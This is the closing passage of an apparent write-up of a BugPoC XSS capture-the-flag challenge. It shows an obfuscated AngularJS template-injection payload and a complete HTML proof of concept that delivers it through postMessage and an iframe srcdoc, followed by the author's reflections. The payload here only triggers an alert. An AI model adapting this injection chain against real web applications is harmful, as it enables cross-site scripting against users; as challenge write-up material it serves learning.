    <h1>{{a=((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(40)+((![]+[])[+!+[]]).constructor.fromCharCode(112)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(99)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(105)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(104)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(115)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(109)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(41);updateCurrNum(a);calculate();1+1}}</h1>
    <iframe name=theiframe></iframe>
</div>
```

![WINNER!](/bugpoc-xss-challenge-2/success.png)

The final PoC is as follows:

```html
<!DOCTYPE HTML>

<html>
    <body>
        <iframe name="mriframe" src="http://calc.buggywebsite.com/frame.html" onload="run()" width="500px" height="700px"></iframe>

        <script>
            function run() {
                mriframe.postMessage('<iframe srcdoc="<script src=angular.min.js><\/script><script src=script.js><\/script><div ng-app=Calculator ng-controller=ArthmeticController><h1>{{a=((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(40)+((![]+[])[+!+[]]).constructor.fromCharCode(112)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(114)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(108)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(99)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(105)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(46)+((![]+[])[+!+[]]).constructor.fromCharCode(104)+((![]+[])[+!+[]]).constructor.fromCharCode(111)+((![]+[])[+!+[]]).constructor.fromCharCode(115)+((![]+[])[+!+[]]).constructor.fromCharCode(116)+((![]+[])[+!+[]]).constructor.fromCharCode(110)+((![]+[])[+!+[]]).constructor.fromCharCode(97)+((![]+[])[+!+[]]).constructor.fromCharCode(109)+((![]+[])[+!+[]]).constructor.fromCharCode(101)+((![]+[])[+!+[]]).constructor.fromCharCode(41);updateCurrNum(a);calculate();1+1}}</h1><iframe name=theiframe></iframe></div>"></iframe>', "*");
            }
        </script>
    </body>
</html>
```

# Conclusion

The biggest thing with this challenge for me was persistence. I could have given up when I hit a roadblock, but because I persisted and tried to remember past experiences with XSS, I managed to solve this challenge.

If you didn’t manage to solve the challenge in the allotted time, don’t worry. Now you know how to solve it and hopefully now you know some new tricks that you can use to solve a future challenge that you may face.

Write-ups like these never truly capture the long and arduous process that leads towards a final exploit. I tried my best to walk you through my thought processes so you get a picture of how I struggled so you don’t feel alone if you didn’t manage to solve it in time.

If you have any questions about my solution or suggestions, hit me up on Twitter and I’ll do my best to answer. Please Tweet publicly and @ me so that other people can also learn from your questions/suggestions.

Till next time.